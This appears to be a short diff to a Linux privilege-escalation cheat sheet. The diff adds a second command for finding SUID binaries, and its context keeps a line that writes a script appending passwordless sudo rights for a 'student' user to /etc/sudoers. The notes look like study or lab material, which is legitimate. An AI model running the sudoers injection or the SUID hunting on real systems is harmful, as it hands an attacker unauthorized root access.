@@ -18,8 +18,13 @@ printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/lo
 > this will add current users to sudoers file as soon as script runs
 
 ### Exploiting SUID Binaries
-```
+```bash
 find / -type f -perm -04000 -ls 2>/dev/null
+```
+
+Another method
+```bash
+find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
 ```
 
 > Indicated by s in permissions (x, h, r, s)
